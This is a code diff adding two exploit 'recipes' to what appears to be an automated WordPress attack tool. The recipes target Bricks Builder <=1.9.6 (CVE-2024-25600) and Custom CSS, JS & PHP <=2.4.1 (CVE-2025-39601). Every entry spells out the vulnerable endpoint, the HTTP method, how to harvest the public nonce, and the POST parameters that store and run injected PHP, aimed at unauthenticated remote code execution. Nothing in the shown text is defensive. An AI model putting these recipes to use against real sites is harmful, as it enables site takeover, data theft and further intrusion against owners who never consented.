@@ -316,6 +316,40 @@ RECIPES = [
                 "chains for RCE. Regression from CVE-2024-9939 patch. CVSS 9.8. No auth required. "
                 "GitHub: Sachinart/CVE-2024-11613-wp-file-upload",
     },
+    {
+        "plugin": "bricks",
+        "cve": "CVE-2024-25600",
+        "affected": "<=1.9.6",
+        "mode": "bricks-rest-api-rce",
+        "method": "POST",
+        "endpoint": "/wp-json/bricks/v1/render_element",
+        "nonce_from": {"url": "/", "key": "nonce", "object": "bricks-scripts-js-extra", "param": "nonce"},
+        "upload_path": "/wp-json/bricks/v1/render_element",
+        "source": "registry",
+        "note": "Unauth REST API RCE (CVE-2024-25600, Bricks Builder <=1.9.6): render_element endpoint "
+                "accepts JavaScript code in queryEditor that executes server-side. Exception messages reveal "
+                "command output. Nonce is public in page JS. CVSS 9.8. Actively exploited in the wild.",
+    },
+    {
+        "plugin": "custom-css-js-php",
+        "cve": "CVE-2025-39601",
+        "affected": "<=2.4.1",
+        "mode": "custom-css-js-php-injection",
+        "method": "POST",
+        "endpoint": "/wp-admin/tools.php",
+        "params": {
+            "page": "alg-custom-php",
+            "alg_custom_css_php_enabled": "1",
+            "alg_custom_css_php_execute": "plugins_loaded",
+            "alg_ccjp_submit": "php",
+        },
+        "upload_path": "/",
+        "source": "registry",
+        "note": "Unauth PHP injection RCE (CVE-2025-39601, Custom CSS, JS & PHP <=2.4.1): "
+                "tools.php allows unauthenticated POST of arbitrary PHP code with NO nonce validation. "
+                "Code stored in wp_options and executes on plugins_loaded hook (every page). CVSS 9.6. "
+                "GitHub: Nxploited/CVE-2025-39601",
+    },
 ]
 
 
